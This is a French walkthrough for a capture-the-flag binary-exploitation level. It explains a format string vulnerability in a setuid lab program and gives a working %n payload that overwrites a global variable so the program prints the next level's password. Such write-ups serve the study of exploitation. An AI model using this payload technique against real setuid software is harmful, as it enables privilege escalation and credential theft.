# Level4 — Walkthrough

## 1. Objectif

Obtenir le mot de passe level5. Le binaire est setuid level5 et peut exécuter **/bin/cat /home/user/level5/.pass** si une condition est remplie.

## 2. Inspection

- **main** appelle **n()**.
- **n()** : `fgets(buffer, 512, stdin)` puis **p(buffer)**. **p()** fait **printf(buffer)** → format string.
- Après **p(buffer)**, lecture de la variable globale **m** (0x8049810). Si **m == 0x1025544** (16930116) : **system("/bin/cat /home/user/level5/.pass")**. Le mot de passe s’affiche directement.

## 3. Vulnérabilité

- **Format string** : l’entrée sert de chaîne de format à **printf**. On écrit en mémoire avec **%n**.
- Il faut écrire **16930116** (0x1025544) à l’adresse **0x8049810**.

## 4. Exploit

- Adresse de **m** (0x8049810) en little endian au début du buffer : `\x10\x98\x04\x08`.
- Puis **%16930112x** (4 + 16930112 = 16930116 octets) et **%k$n**. L’index **k** est celui pour lequel le dump affiche **0x41414141** (les "AAAA") ; sur l’ISO officielle c’est **12**.
- Commande qui fonctionne :  
  `python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4`  
  Attendre 10–30 s ; le mot de passe level5 s’affiche à la fin.

## 5. Récupération du mot de passe

Le mot de passe s’affiche à la fin de la sortie. Le consigner dans `level4/flag`.
